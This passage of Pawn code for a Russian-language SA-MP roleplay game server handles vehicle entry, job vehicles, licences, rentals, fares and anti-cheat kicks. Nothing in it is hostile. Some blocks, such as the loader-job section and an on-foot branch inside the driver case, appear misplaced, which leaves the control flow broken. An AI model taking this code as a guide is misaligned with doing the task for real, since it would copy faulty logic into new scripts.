	}
	if(EtherLive[playerid] == true)
	{
		EtherLive[playerid] = false;
		DeletePVar(playerid, "Etherfrac");
		SendClientMessage(playerid, COLOR_LIGHTRED, "Вы вышли из прямого эфира");
	}
	if(GetPVarInt(playerid, "Noun") > 0)
	{
		if(GetPVarInt(playerid, "NounObjID") > 0)
		{
			DestroyObject(NounObject[GetPVarInt(playerid, "NounObjID")]);
			if(GetPVarInt(playerid, "NounObjID") < 10) NounObject[GetPVarInt(playerid, "NounObjID")] = CreateObject(3930,560.3654+random(10),840.2457+random(75),-44.00700073,0.00000000,0.00000000,0.00000000);
			else NounObject[GetPVarInt(playerid, "NounObjID")] = CreateObject(3930,615.3654+random(55),815.2457+random(65),-43.6009,0.00000000,0.00000000,0.00000000);
			DeletePVar(playerid, "NounObjID");
			DisablePlayerRaceCheckpoint(playerid);
			SetPVarInt(playerid, "Noun", 1);
		}
	}
	return true;
}
public OnPlayerCommandText(playerid, cmdtext[])
{
	if(Ivd(playerid,cmdtext)) return 1;
	return 1;
}
public OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid)
{
	if(IsAnDMZone(damagedid))
	{
		if(GetPVarInt(playerid,"DMWarning") == 5)
		{
			SendClientMessage(playerid,COLOR_YELLOW,"Вы были кикнуты, при следующей попытке вы будете заблокированы на 1 день.");
			KickEx(playerid,0);
		}
		SetPVarInt(playerid,"DMWarning",GetPVarInt(playerid,"DMWarning")+1);
		ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"Предупреждение!","Вы находитесь в зеленой зоне, тут драться нельзя\nУспокойтесь, в противном случае вы будете кикнуты!","ЗАКРЫТЬ","");
	}
	return true;
}
public OnPlayerStateChange(playerid, newstate, oldstate)
{
	new string[128];
	CheckCarSlap(playerid,newstate);
	if(newstate == PLAYER_STATE_DRIVER)
	{
		new model = GetPlayerVehicleSeat(playerid);
		if(model != 128)
		{
			if(!model)
			{
				model = GetVehicleModel(GetPlayerVehicleID(playerid));
				if(!(400 <= model <= 611) || MaxPassengers[model - 400 >>> 3] >>> ((model - 400 & 7) << 2) & 0xF == 15) return GKick(playerid);
			}
			else return GKick(playerid);
		}
	}
	if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER )
	{
		if(IDVEH[playerid] != GetPlayerVehicleID(playerid) || !UseEnter[playerid])
		{
			Punish(playerid);
		}
		UseEnter[playerid] = false;
	}
	if(newstate == 2) SetPVarInt(playerid,"ENT_GTC",GetTickCount());
	else if(oldstate == 2)
	{
		if((GetTickCount() - GetPVarInt(playerid,"ENT_GTC")) <= 1000) return KickEx(playerid,3233);
	}
	if(newstate == PLAYER_STATE_PASSENGER)
	{
		new model = GetVehicleModel(GetPlayerVehicleID(playerid));
		if(400 <= model <= 611)
		{
			model -= 400;
			new seat = GetPlayerVehicleSeat(playerid);
			if(seat != 128)
			{
				model = (MaxPassengers[model >>> 3] >>> ((model & 7) << 2)) & 0xF;
				if(!model || model == 15) return KickEx(playerid,116);
				else if(!(0 < seat <= model) && (model != 431 || model != 437)) return KickEx(playerid,117);
			}
			else return KickEx(playerid,118);
		}
	}
	new minute,second;
	gettime(minute,minute,second);
	if(newstate == 2)
	{
		new Float:vehz;
		new vehid = GetPlayerVehicleID(playerid);
		GetVehiclePos(vehid,vehz,vehz,vehz);
		if(vehz > 1300.000)
		{
			SetVehicleToRespawn(vehid);
			KickEx(playerid,119);
		}
		if(GetPVarInt(playerid,"AC_SECSD") == second)
		{
			if(GetPVarInt(playerid,"AC_VEHID") != GetPlayerVehicleID(playerid))
			{
				KickEx(playerid,117);
				return true;
			}
		}
		SetPVarInt(playerid,"AC_SECSD",second);
		SetPVarInt(playerid,"AC_VEHID",GetPlayerVehicleID(playerid));
   }
	switch(newstate)
	{
	case 1: //Игрок пешком (можно писать PLAYER_STATE_ONFOOT)
		{
			KillTimer(STimer[playerid]);
			KillTimer(SSTimer[playerid]);
			TextDrawHideForPlayer(playerid,Box);
			TextDrawHideForPlayer(playerid,LBorder);
			TextDrawHideForPlayer(playerid,RBorder);
			TextDrawHideForPlayer(playerid,BBorder);
			TextDrawHideForPlayer(playerid,TBorder);
			TextDrawHideForPlayer(playerid,Speed);
			TextDrawHideForPlayer(playerid,SpeedShow[playerid]);
			TextDrawHideForPlayer(playerid,Speed2Show[playerid]);
			TextDrawHideForPlayer(playerid,Health);
			TextDrawHideForPlayer(playerid,HealthShow[playerid]);
			TextDrawHideForPlayer(playerid,Fuell);
			TextDrawHideForPlayer(playerid,FuelShow[playerid]);
			TextDrawHideForPlayer(playerid,StatusShow[playerid]);
			TextDrawHideForPlayer(playerid,EngineShow[playerid]);
			if(GetPVarInt(playerid, "ProductID") > 0)
			{
				SendClientMessage(playerid, COLOR_LIGHTRED, "У вас есть 15 секунд, чтобы вернуться");
				DisablePlayerRaceCheckpoint(playerid);
				Delete3DTextLabel(ProductInfo[GetPVarInt(playerid, "ProductID")][pText3D]);
				ProductTime[playerid] = 15;
			}
			foreach(new i:Player)
			{
				if(GetPVarInt(i,"FarmCombainer") != 0)
				{
					SendClientMessage(i,-1,"Вы отменили рассаду на ферме!");
					DeletePVar(i,"FarmCombainer");
					DisablePlayerRaceCheckpoint(i);
				}
			}
			if(GetPVarInt(playerid, "FuelID") > 0)
			{
				SendClientMessage(playerid, COLOR_LIGHTRED, "У вас есть 15 секунд, чтобы вернуться");
				DisablePlayerRaceCheckpoint(playerid);
				Delete3DTextLabel(FuelInfo[GetPVarInt(playerid, "FuelID")][pText3D]);
				FuelTime[playerid] = 15;
			}
			if(materials_Status[playerid] > 0)
			{
				SendClientMessage(playerid, COLOR_LIGHTRED, "У вас есть 15 секунд, чтобы вернуться");
				DisablePlayerRaceCheckpoint(playerid);
				Delete3DTextLabel(materials_Label[playerid]);
				materials_Time[playerid] = 15;
			}
			if(GetPVarInt(playerid, "LicTest") > 0)
			{
				SendClientMessage(playerid, COLOR_LIGHTRED, "У вас есть 15 секунд, чтобы вернуться");
				DisablePlayerRaceCheckpoint(playerid);
				lictest_Time[playerid] = 15;
			}
			if(GetPVarInt(playerid, "PriceBus") > 0)
			{
				SendClientMessage(playerid, COLOR_LIGHTRED, "У вас есть 15 секунд, чтобы вернуться");
				DisablePlayerRaceCheckpoint(playerid);
				Delete3DTextLabel(BusText3D[playerid]);
				SetPVarInt(playerid, "BusTime", 15);
			}
		}
	case 2: //Игрок в машине, на месте водителя (можно писать PLAYER_STATE_DRIVER)
		{
			new cars = 0;
			if(GetPVarInt(playerid,"PEREVOZ") > 0)
			{
				DestroyVehicle(GetPVarInt(playerid,"PEREVOZVEH"));
				DeletePVar(playerid,"PEREVOZ");
				DeletePVar(playerid,"PEREVOZVEH");
				DisablePlayerRaceCheckpoint(playerid);
			}
			if(InShop[playerid] < 1 || GetPVarInt(playerid, "InShop") == 0)
			{
				new temp, vehicleid = GetPlayerVehicleID(playerid);
				temp = GetVehicleModel( GetPlayerVehicleID( playerid ) );
				BE_Play_Check[ playerid ] = true;
				for(new i; i != sizeof( BE_Bad_Vehs ); i++ )
				{
					if( temp == BE_Bad_Vehs[ i ] ) cars++,BE_Play_Check[ playerid ] = false;
				}
				if(IsABoat(vehicleid))
				{
					if(PlayerInfo[playerid][pLic][1] != 1)
					{
						SendClientMessage(playerid, COLOR_GREY, "У вас нет лицензии на морской транспорт!");
						RemoveFromVehicle(playerid);
						return true;
					}
				}
				if(IsAPlane(vehicleid))
				{
					if(PlayerInfo[playerid][pLic][2] != 1)
					{
						SendClientMessage(playerid, COLOR_GREY, "У вас нет лицензии на воздушный транспорт!");
						RemoveFromVehicle(playerid);
						return true;
					}
				}
				for(new v = 1; v <= TOTALVEH; v++)
				{
					if(vehicleid == VehInfo[v][vVehicle])
					{
						if(VehInfo[v][vFr] == F_LIC && GetPVarInt(playerid, "LicTest") > 0)
						{
							SendClientMessage(playerid, COLOR_BLUE, "Следуйте по чекпоинтам, соблюдая правила дорожного движения");
							ShowPlayerDialog(playerid, D_NULL, 0, "{33AAFF}Права", "{ffffff}Ваша задача следовать по чекпоинтам. Вперед", "Закрыть", "");
							new i = pPressed[playerid];
							SetPlayerRaceCheckpoint(playerid,0,LicTest[i][0],LicTest[i][1],LicTest[i][2],LicTest[i][3],LicTest[i][4],LicTest[i][5],5.0);
						}
						if(VehInfo[v][vFr] != PlayerInfo[playerid][pMember])
						{
							if(VehInfo[v][vFr] == F_LIC && GetPVarInt(playerid, "LicTest") > 0) { }
							else
							{
								SendClientMessage(playerid, COLOR_GREY, "Этот транспорт вам не доступен!");
								RemoveFromVehicle(playerid);
								return true;
							}
						}
						else break;
					}
				}
				if(cars == 0)
				{
					if(PlayerInfo[playerid][pLic][0] != 1)
					{
						if(GetPVarInt(playerid, "LicTest") > 0) { }
						else
						{
							if(GetVehicleModel(vehicleid) != 462 && GetVehicleModel(vehicleid) != 481 && GetVehicleModel(vehicleid) != 510 && GetVehicleModel(vehicleid) != 509)
							{
								SendClientMessage(playerid, COLOR_GREY, "У вас нет водительских прав!");
								RemoveFromVehicle(playerid);
								return true;
							}
						}
					}
					if(Engine[GetPlayerVehicleID(playerid)] == false)
					{
						if(IsABike(GetPlayerVehicleID(playerid)))
						{
							GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
						}
						else SendClientMessage(playerid, COLOR_LIGHTGREEN, "{ffffff}Чтобы завести двигатель, нажмите: {9ACD32}2");
					}
					if(!IsAMoped(GetPlayerVehicleID(playerid)))
					{
						STimer[playerid] = SetTimerEx("UpdateSpeedometr", ONE_HUNDRED_MSECOND, 1, "d", playerid);
						VehRe[playerid] = true;
						SSTimer[playerid] = SetTimerEx("AutoSkills", ONE_SECOND_UPDATE, 1, "d", playerid);
						GetVehicleHealth(GetPlayerVehicleID(playerid), VehicleHealNow[playerid]);
						TextDrawShowForPlayer(playerid,Box);
						TextDrawShowForPlayer(playerid,LBorder);
						TextDrawShowForPlayer(playerid,RBorder);
						TextDrawShowForPlayer(playerid,BBorder);
						TextDrawShowForPlayer(playerid,TBorder);
						TextDrawShowForPlayer(playerid,Speed);
						TextDrawShowForPlayer(playerid,SpeedShow[playerid]);
						TextDrawShowForPlayer(playerid,Speed2Show[playerid]);
						TextDrawShowForPlayer(playerid,Health);
						TextDrawShowForPlayer(playerid,HealthShow[playerid]);
						TextDrawShowForPlayer(playerid,Fuell);
						TextDrawShowForPlayer(playerid,FuelShow[playerid]);
						TextDrawShowForPlayer(playerid,StatusShow[playerid]);
						TextDrawShowForPlayer(playerid,EngineShow[playerid]);
					}
					if(GetVehicleModel(vehicleid) == 433 && (PlayerInfo[playerid][pMember] == F_ARMY || IsAGang(playerid)))
					{
						SendMes(playerid, COLOR_LIGHTGREEN, "материалов: {ffffff}%i / 10000", materials_Vehicle[vehicleid]);
						if(materials_Time[playerid] > 0)
						{
							materials_Time[playerid] = 0;
							DisablePlayerRaceCheckpoint(playerid);
							format(string, 50, "{9ACD32}Материалов: {ffffff}%i / 10000", materials_Vehicle[vehicleid]);
							materials_Label[playerid] = Create3DTextLabel(string, COLOR_WHITE, 0.0, 0.0, 0.0, 30.0, 0, 1);
							Attach3DTextLabelToVehicle(materials_Label[playerid], GetPlayerVehicleID(playerid), 0, -2.0, 0.5);
							if(materials_Status[playerid] == 1) SetPlayerRaceCheckpoint(playerid, 1, 1528.7881,-1677.7826,5.8906, 0.0,0.0,0.0,6);
							if(materials_Status[playerid] == 2) SetPlayerRaceCheckpoint(playerid, 1, -1606.3987,676.3289,-5.2422, 0.0,0.0,0.0,6);
							if(materials_Status[playerid] == 3) SetPlayerRaceCheckpoint(playerid, 1, 2292.7478,2468.5667,10.8203, 0.0,0.0,0.0,6);
							if(materials_Status[playerid] == 4) SetPlayerRaceCheckpoint(playerid, 1, 332.5203,1963.1411,17.6406, 0.0,0.0,0.0,6);
						}
					}
					if(vehicleid >= faggio[0] && vehicleid <= faggio[1])
					{
						if(PlayerInfo[playerid][pLevel] >= 4)
						{
							SendClientMessage(playerid, COLOR_GREY, "Транспорт для новичков! [1-3 уровня]");
							RemoveFromVehicle(playerid);
						}
					}
					if(vehicleid >= fuelcar[0] && vehicleid <= fuelcar[1])
					{
						if(PlayerInfo[playerid][pJob] != J_FUEL)
						{
							SendClientMessage(playerid, COLOR_GREY, "Вы не развозчик топлива!");
							RemoveFromVehicle(playerid);
							return true;
						}
						if(GetPVarInt(playerid, "FuelCar") == GetPlayerVehicleID(playerid))
						{
							if(GetVehicleModel(vehicleid) == 583 && GetPVarInt(playerid, "FuelCarLittle") == 0)
							{
								SetPVarInt(playerid, "FuelCarLittle", 1);
								new full;
								for(new i = 0; i < 5; i++)
								{
									if(MafiaInfo[3][mFuel][i] > 100) full = i+1;
								}
								if(full == 0)
								{
									PlayerInfo[playerid][pPayCheck] += GetPVarInt(playerid, "JobLittlePrice");
									DeletePVar(playerid, "LittleFull");
									DeletePVar(playerid, "JobLittlePrice");
									DeletePVar(playerid, "FuelCarLittle");
									RemoveFromVehicle(playerid);
									return SendClientMessage(playerid, COLOR_GREY, "В скважинах нет топлива, подождите!");
								}
								SendClientMessage(playerid, COLOR_YELLOW, "Следуйте на чекпоинт, чтобы взять груз");
								SetPVarInt(playerid, "LittleFull", full);
								full--;
								if(full == 0) SetPlayerRaceCheckpoint(playerid, 1, 433.7109,1580.9321,11.4922, 0.0, 0.0, 0.0, 5.0);
								if(full == 1) SetPlayerRaceCheckpoint(playerid, 1, 600.3598,1515.3052,7.8325, 0.0, 0.0, 0.0, 5.0);
								if(full == 2) SetPlayerRaceCheckpoint(playerid, 1, 578.3732,1439.7570,11.1406, 0.0, 0.0, 0.0, 5.0);
								if(full == 3) SetPlayerRaceCheckpoint(playerid, 1, 627.6626,1369.1279,11.9845, 0.0, 0.0, 0.0, 5.0);
								if(full == 4) SetPlayerRaceCheckpoint(playerid, 1, 353.2522,1317.3221,12.4766, 0.0, 0.0, 0.0, 5.0);
							}
							if(FuelTime[playerid] > 0)
							{
								new Float:VPos[3], i = FuelInfo[GetPVarInt(playerid, "FuelID")][pBizzid];
								FuelTime[playerid] = 0;
								GetPlayerPos(playerid, VPos[0], VPos[1], VPos[2]);
								DisablePlayerRaceCheckpoint(playerid);
								SetPlayerRaceCheckpoint(playerid, 1, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz], 0.0,0.0,0.0,6);
								format(string, 100, "{9ACD32}Топлива: {ffffff}%i / 50000{9ACD32} литров", FuelInfo[GetPVarInt(playerid, "FuelID")][pTill]);
								FuelInfo[GetPVarInt(playerid, "FuelID")][pText3D] = Create3DTextLabel(string, 0xffffffff, 0.0, 0.0, 0.0, 30.0, 0, 1);
								Attach3DTextLabelToVehicle(FuelInfo[GetPVarInt(playerid, "FuelID")][pText3D], GetPlayerVehicleID(playerid), 0, -1.0, 2.0);
							}
						}
						else ShowPlayerDialog(playerid, D_JOB+124, 0, "{ffffff}Аренда", "{ffffff}Вы хотите арендовать данное тр. средство?\n\nСтоимость: {33CCFF}1000{ffffff} долларов", "Да", "Нет");

					}
					if(vehicleid >= jobproduct[0] && vehicleid <= jobproduct[1])
					{
						if(PlayerInfo[playerid][pJob] != J_PRODUCT)
						{
							SendClientMessage(playerid, COLOR_GREY, "Вы не развозчик продуктов!");
							RemoveFromVehicle(playerid);
							return true;
						}
						if(ProductTime[playerid] > 0)
						{
							new Float:VPos[3], i = ProductInfo[GetPVarInt(playerid, "ProductID")][pBizzid];
							ProductTime[playerid] = 0;
							GetPlayerPos(playerid, VPos[0], VPos[1], VPos[2]);
							DisablePlayerRaceCheckpoint(playerid);
							SetPlayerRaceCheckpoint(playerid, 1, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz], 0.0,0.0,0.0,6);
							format(string, 50, "{9ACD32}Продуктов: {ffffff}%i", ProductInfo[GetPVarInt(playerid, "ProductID")][pTill]);
							ProductInfo[GetPVarInt(playerid, "ProductID")][pText3D] = Create3DTextLabel(string, 0xffffffff, 0.0, 0.0, 0.0, 30.0, 0, 1);
							Attach3DTextLabelToVehicle(ProductInfo[GetPVarInt(playerid, "ProductID")][pText3D], GetPlayerVehicleID(playerid), 0, -1.0, 0.5);
						}
					}
					if(vehicleid >= fbicar[0] && vehicleid <= fbicar[8])
					{
						if(PlayerInfo[playerid][pMember] != F_FBI)
						{
							SendClientMessage(playerid, COLOR_GREY, "Этот транспорт, только для сотрудников FBI");
							RemovePlayerFromVehicle(playerid);
						}
					}
					if(vehicleid >= grarm1car[0] && vehicleid <= grarm1car[1])
					{
						if(PlayerInfo[playerid][pMember] != F_ARMY)
						{
							SendClientMessage(playerid, COLOR_GREY, "Вам недоступен данный транспорт");
							RemovePlayerFromVehicle(playerid);
						}
					}
					if(vehicleid >= grarm1car[0] && vehicleid <= grarm1car[1])
					{
						if(PlayerInfo[playerid][pMember] == F_ARMY)
						{
							ShowPlayerDialog(playerid, D_HEAL+25, DIALOG_STYLE_MSGBOX, "{ffffff}Доставка", "{ffffff}Вы хотите начать миссию по доставке металла?", "Да", "Нет");
						}
					}
					if(vehicleid >= trucker3lvl[0] && vehicleid <= trucker3lvl[1])
					{
						if(PlayerInfo[playerid][pJob] == J_TRUCKER)
						{
							if(PlayerInfo[playerid][pTruckSkill] >= 10000)
							{
								if(GetPVarInt(playerid, "TruckCar") == GetPlayerVehicleID(playerid)) { }
								else ShowPlayerDialog(playerid, 11212, 0, "{ffffff}Аренда", "{ffffff}Вы хотите арендовать данное тр. средство?\n\nСтоимость: {33CCFF}5000{ffffff} долларов", "Да", "Нет");
							}
							else
							{
								SendClientMessage(playerid, COLOR_GREY, "Ваш навык дальнобойщика не достаточно высокий (используйте /tskill)!");
								RemoveFromVehicle(playerid);
								return true;
							}
						}
						else
						{
							SendClientMessage(playerid, COLOR_GREY, "Вы не дальнобойщик!");
							RemoveFromVehicle(playerid);
							return true;
						}
					}
					if(vehicleid >= trucker1lvl[0] && vehicleid <= trucker1lvl[1])
					{
						if(PlayerInfo[playerid][pJob] != J_TRUCKER)
						{
							SendClientMessage(playerid, COLOR_GREY, "Вы не дальнобойщик!");
							RemoveFromVehicle(playerid);
							return true;
						}
						if(GetPVarInt(playerid, "TruckCar") == GetPlayerVehicleID(playerid)) { }
						else ShowPlayerDialog(playerid, 11212, 0, "{ffffff}Аренда", "{ffffff}Вы хотите арендовать данное тр. средство?\n\nСтоимость: {33CCFF}5000{ffffff} долларов", "Да", "Нет");
					}
					if(vehicleid >= mechanic[0] && vehicleid <= mechanic[1])
					{
						if(PlayerInfo[playerid][pJob] != J_MECHANIC)
						{
							SendClientMessage(playerid, COLOR_GREY, "Вы не автомеханик!");
							RemoveFromVehicle(playerid);
							return true;
						}
						if(GetPVarInt(playerid, "Mechanic") == GetPlayerVehicleID(playerid)) { }
						else ShowPlayerDialog(playerid, D_JOB+66, 0, "{ffffff}Аренда", "{ffffff}Вы хотите арендовать данное тр. средство?\n\nСтоимость: {33CCFF}500{ffffff} долларов", "Да", "Нет");
					}
					if(vehicleid == farm1car[0] || vehicleid == farm1car[1])
					{
						if(IsAFarmer(playerid) && GetPVarInt(playerid,"FarmDuty") == 1)
						{
							if(vehiclerun[vehicleid] == 1) return ShowPlayerDialog(playerid,13123,DIALOG_STYLE_MSGBOX,"Закончить сбор","Вы хотите закончить сборы?","Да","Нет");
							if(vehicleid == farm1car[1])
							{
								if(FarmWork < 350) return SendClientMessage(playerid,-1,"На поле достаточно урожая!"),RemoveFromVehicle(playerid);
								else
								{
									ShowPlayerDialog(playerid, 6161, 0, "{ffffff}Комбайнер", "{ffffff}Вы хотите начать рассаду урожая?", "Да", "Нет");
								}
							}
							else
							{
								SendClientMessage(playerid,COLOR_WHITE,"Введите /fload что бы начать работу фермера");
							}
						}
						else
						{
							SendClientMessage(playerid,COLOR_WHITE,"Вам недоступен транспорт фермеров");
							RemoveFromVehicle(playerid);
						}
					}
					if(vehicleid >= taxicar[0] && vehicleid <= taxicar[1])
					{
						if(PlayerInfo[playerid][pJob] != J_TAXI)
						{
							SendClientMessage(playerid, COLOR_GREY, "Вы не таксист!");
							RemoveFromVehicle(playerid);
							return true;
						}
						if(GetPVarInt(playerid, "RentTaxi") == GetPlayerVehicleID(playerid)) { }
						
						else
						{
							SetTimerEx("CheckRentCar",8000,0,"i",playerid);
							ShowPlayerDialog(playerid, D_JOB+59, 0, "{ffffff}Аренда", "{ffffff}Вы хотите арендовать данное такси?\n\nСтоимость: {33CCFF}500{ffffff} долларов", "Да", "Нет");
						}
					}
					if(vehicleid >= nouncar[0] && vehicleid <= nouncar[1])
					{
						if(GetPVarInt(playerid, "Noun") == 0)
						{
							SendClientMessage(playerid, COLOR_GREY, "Вы не работаете на бульдозере!");
							RemoveFromVehicle(playerid);
							return true;
						}
						SendClientMessage(playerid, COLOR_GREEN, "Следуйте на чекпоинт и прицепите камень к бульдозеру");
						new randobj = random(19);
						new Float:X, Float:Y, Float:Z;
						GetObjectPos(NounObject[randobj], X, Y, Z);
						SetPVarInt(playerid, "NounObjID", randobj);
						SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0,0.0,0.0,3);
						return true;
					}
					if(vehicleid >= pogruz[0] && vehicleid <= pogruz[1])
		            {
                    if(Gruzik[playerid] == 0)
					{
							SendClientMessage(playerid, COLOR_GREY, "Вначале устройтесь!");
							RemoveFromVehicle(playerid);
							return true;
					}
      if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 530) // 530 это погрузчик
      {
      new rand = random(sizeof(checkLoader));
      hereCheckLoader[playerid] = CreateDynamicCP(checkLoader[rand][0], checkLoader[rand][1], checkLoader[rand][2], 1.6, -1, -1, playerid, 100.0);
      ShowPlayerDialog(playerid, 666, DIALOG_STYLE_MSGBOX, "Начальник говорит", "Это работа не так уж и проста.\nИщи красные чекпоинты по Форт Карсону и отвози их на склад, понял?", "Хорошо", ""); // Покажем игроку диалог
      }
    }
     else if(newstate == PLAYER_STATE_ONFOOT)
    {
      if(hereCheckLoader[playerid]) DestroyDynamicCP(hereCheckLoader[playerid]);
      if(hereCheckUnLoader[playerid]) DestroyDynamicCP(hereCheckUnLoader[playerid]);
    }
	if((newstate == 2 && oldstate == 3) || (newstate == 3 && oldstate == 2)  || (newstate == 2 && oldstate == 2))
	{
		new vehid = GetPlayerVehicleID(playerid);
		SetPVarInt(playerid,"AC124",GetPVarInt(playerid,"AC124")+1);
		if(GetPVarInt(playerid,"AC124") >= 3)
		{
			SetVehicleToRespawn(vehid);
			KickEx(playerid,115);
		}
		return true;
	}
					if(vehicleid >= buscar[0] && vehicleid <= buscar[1])
					{
						if(PlayerInfo[playerid][pJob] != J_BUS)
						{
							SendClientMessage(playerid, COLOR_GREY, "Вы не работаете водителем автобуса!");
							RemoveFromVehicle(playerid);
							return true;
						}
						if(GetPVarInt(playerid, "BusTime") > 0 && GetPVarInt(playerid, "PriceBus") > 0 && GetPVarInt(playerid, "RentBus") == GetPlayerVehicleID(playerid))
						{
							new i = pPressed[playerid], type = GetPVarInt(playerid, "TypeBus"),name[32];
							switch(type)
							{
							case 1: name = "Внутри-городской ЛС";
							case 2: name = "Внутри-городской СФ";
							case 3: name = "Внутри-городской ЛВ";
							case 4: name = "ЖД вокзал - Автошкола";
							case 5: name = "ЖД вокзал - Карьер";
							}
							format(string, 90, "%s\n{ffffff}Стоимость проезда: {33AAFF}%i {ffffff}долларов", name, GetPVarInt(playerid, "PriceBus"));
							BusText3D[playerid] = Create3DTextLabel(string, 0x33AAFFFF, 0.0, 0.0, 0.0, 50.0, 0, 1);
							Attach3DTextLabelToVehicle(BusText3D[playerid], GetPlayerVehicleID(playerid), 0.0, 0.0, 2.25);
							if(type == 1) SetPlayerRaceCheckpoint(playerid,0,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],5.0);
							if(type == 2) SetPlayerRaceCheckpoint(playerid,0,BusCitySF[i][0],BusCitySF[i][1],BusCitySF[i][2],BusCitySF[i][3],BusCitySF[i][4],BusCitySF[i][5],5.0);
							if(type == 3) SetPlayerRaceCheckpoint(playerid,0,BusCityLV[i][0],BusCityLV[i][1],BusCityLV[i][2],BusCityLV[i][3],BusCityLV[i][4],BusCityLV[i][5],5.0);
							if(type == 4) SetPlayerRaceCheckpoint(playerid,0,BusSchool[i][0],BusSchool[i][1],BusSchool[i][2],BusSchool[i][3],BusSchool[i][4],BusSchool[i][5],5.0);
							if(type == 5) SetPlayerRaceCheckpoint(playerid,0,BusLS[i][0],BusLS[i][1],BusLS[i][2],BusLS[i][3],BusLS[i][4],BusLS[i][5],5.0);
							DeletePVar(playerid, "BusTime");
						}
						if(GetPVarInt(playerid, "RentBus") == GetPlayerVehicleID(playerid)) { }
						else
						{
							SetTimerEx("CheckRentCar",8000,0,"i",playerid);
							ShowPlayerDialog(playerid, D_JOB+58, 0, "{ffffff}Аренда", "{ffffff}Вы хотите арендовать данный автобус?\n\nСтоимость: {33CCFF}500{ffffff} долларов", "Да", "Нет");
						}
					}
					if(vehicleid >= rentcar[0] && vehicleid <= rentcar[1])
					{
						if(rent_Vehicle[playerid] == GetPlayerVehicleID(playerid)) { }
						else
						{
							ShowPlayerDialog(playerid, D_JOB+23, 0, "{ffffff}Аренда", "{ffffff}Вы хотите арендовать данный транспорт?\n\nСтоимость: {33CCFF}3000{ffffff} долларов", "Да", "Нет");
							SetTimerEx("CheckRentCar",3000,0,"i",playerid);
						}
					}
					if(GetVehicleModel(vehicleid) == 482)
					{
						if(GunKG[vehicleid] > 0) SendMes(playerid, COLOR_WHITE, "Материалов в авто: {ffff00}%i{ffffff}", GunKG[vehicleid]);
						else SendClientMessage(playerid, COLOR_WHITE, "В транспорте пустой багажник");
					}
				}
			}
		}
	case 3: //Игрок в машине, на месте пассажира - (можно писать PLAYER_STATE_PASSENGER)
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			foreach(new i:Player)
			{
				if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
				if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) == 2)
				{
					if(GetPVarInt(i, "PriceBus") > 0)
					{
						if(GetMoney(playerid) < GetPVarInt(i, "PriceBus"))
						{
							SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
							RemoveFromVehicle(playerid);
						}
						else
						{
							GiveMoney(playerid, -GetPVarInt(i, "PriceBus"));
							SendMes(playerid, COLOR_BLUE, "Вы заплатили %i долларов за проезд водителю %s'у",GetPVarInt(i, "PriceBus"), PlayerInfo[i][pSendername]);
							PlayerInfo[i][pPayCheck] += GetPVarInt(i, "PriceBus");
							SendMes(i, COLOR_BLUE, "Пассажир %s заплатил %i долларов за проезд", PlayerInfo[playerid][pSendername], GetPVarInt(i, "PriceBus"));
							format(string, 32, "~r~-%i$",  GetPVarInt(i, "PriceBus"));
							GameTextForPlayer(playerid, string, 5000, 1);
							format(string, 32, "~b~+%i$", GetPVarInt(i, "PriceBus"));
							GameTextForPlayer(i, string, 5000, 1);
						}
					}
					if(GetPVarInt(i, "PriceTaxi") > 0)
					{
						if(GetMoney(playerid) < GetPVarInt(i, "PriceTaxi"))
						{
							SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
							RemoveFromVehicle(playerid);
						}
						else
						{
							GiveMoney(playerid, -GetPVarInt(i, "PriceTaxi"));
							PlayerInfo[i][pPayCheck] += GetPVarInt(i, "PriceTaxi");
							SetPVarInt(playerid, "TimeTaxi", 30);
							SetPVarInt(playerid, "TaxiPrice",GetPVarInt(i, "PriceTaxi"));
							SetPVarInt(playerid, "PlayerTaxi", i);
							format(string, 32, "~r~-%i$", GetPVarInt(i, "PriceTaxi"));
							GameTextForPlayer(playerid, string, 5000, 1);
							format(string, 32, "~b~+%i$", GetPVarInt(i, "PriceTaxi"));
							GameTextForPlayer(i, string, 5000, 1);
							SetPVarInt(i, "TaxiMoney", GetPVarInt(i, "TaxiMoney") + GetPVarInt(i, "PriceTaxi"));
						}
					}
				}
			}
		}
	case 4: //Игрок вышел из машины
		{
			BE_Play_Check[ playerid ] = false;
		}
	case 5: //Игрок сел в машину на место водителя
		{
		}
	case 6: //Игрок сел в машину на место пассажира
		{
		}
	case 7: //Игрок выбирает скин (можно писать PLAYER_STATE_WASTED)
		{
		}
	case 8: //Игрок возродился (можно писать PLAYER_STATE_SPAWNED)
		{
		}
	case 9: //Игрок наблюдает с помощью функции SPECTATING (можно писать PLAYER_STATE_SPECTATING)
		{
		}
	}
	return true;
}
public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
	for(new idx = 1; idx <= TOTALBIZZ;idx++)
	{
		if(checkpointid == BizzInfo[idx][bMenu])
		{
			if(BizzInfo[idx][bType] == 1) MagazineList(playerid, idx);
			else if(BizzInfo[idx][bType] == 3) EatList(playerid, idx);
			else if(BizzInfo[idx][bType] == 4 || BizzInfo[idx][bType] == 5) ClubList(playerid, idx);
			else if(BizzInfo[idx][bType] == 6) GunShopList(playerid, idx);
		}
	}
	if(checkpointid == Pickup[1])
	{
		if(PlayerInfo[playerid][pJob] == J_TRUCKER) ResetTruck(playerid);
		if(PlayerInfo[playerid][pMember] > 0) return SendClientMessage(playerid, COLOR_GREY, "Сначала увольтесь из организации!");
		if(PlayerInfo[playerid][pJob] > 0) return SendClientMessage(playerid, COLOR_GREY, "Сначала увольтесь с прежней работы!");
